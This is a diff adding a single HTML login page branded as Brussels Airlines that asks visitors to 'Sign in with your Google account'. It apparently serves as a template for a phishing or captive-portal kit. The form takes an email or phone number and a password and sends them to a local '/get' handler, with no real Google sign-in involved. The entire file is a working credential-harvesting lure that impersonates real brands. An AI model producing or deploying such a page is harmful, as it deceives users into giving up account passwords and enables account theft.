@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.brand-name {
+  font-size: 42px;
+  color: #002C69;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #002C69;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #002C69;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #E5002B;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #E5002B;
+  border: none;
+  color: #002C69;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #FFC72C;
+}
+}
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="225.000000pt" height="225.000000pt" viewBox="0 0 225.000000 225.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,225.000000) scale(0.100000,-0.100000)"
+fill="#E5002B" stroke="none">
+<path d="M1624 1831 c-35 -16 -82 -77 -89 -120 -9 -52 20 -119 66 -152 26 -18
+47 -24 89 -24 69 0 114 29 142 92 27 62 17 114 -32 166 -34 37 -42 41 -96 44
+-32 1 -68 -1 -80 -6z"/>
+<path d="M1069 1785 c-28 -15 -59 -69 -59 -103 0 -35 43 -86 86 -101 35 -12
+44 -12 75 3 19 9 43 29 52 45 58 99 -53 211 -154 156z"/>
+<path d="M530 1783 c-56 -20 -83 -89 -56 -141 20 -39 44 -52 94 -52 54 0 92
+38 92 92 0 50 -13 74 -50 93 -30 15 -53 18 -80 8z"/>
+<path d="M1045 1302 c-139 -65 -154 -255 -27 -343 67 -46 181 -37 246 20 61
+54 75 183 27 253 -55 80 -160 110 -246 70z"/>
+<path d="M1651 1289 c-68 -14 -120 -72 -128 -142 -7 -61 11 -109 56 -150 120
+-109 304 -2 277 161 -14 90 -110 151 -205 131z"/>
+<path d="M505 1256 c-51 -23 -77 -60 -83 -117 -9 -93 49 -159 140 -159 86 0
+153 73 145 157 -10 100 -111 160 -202 119z"/>
+<path d="M1055 716 c-70 -31 -115 -122 -95 -196 41 -151 244 -178 317 -41 29
+55 29 102 2 158 -38 79 -141 115 -224 79z"/>
+<path d="M495 637 c-20 -16 -28 -35 -32 -69 -5 -42 -3 -50 25 -78 59 -58 159
+-31 177 49 20 93 -98 161 -170 98z"/>
+<path d="M1619 631 c-64 -65 -20 -171 71 -171 33 0 48 6 71 29 64 65 20 171
+-71 171 -33 0 -48 -6 -71 -29z"/>
+</g>
+</svg>
+
+
+
+    <div class="brand-name">Brussels Airlines</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your <b>Google</b> account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	  <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+      <button class="submit-btn" type="submit"><b>Continue</b></button>
+
+	  				<div class="error-message"></div>
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</body>
+</html>
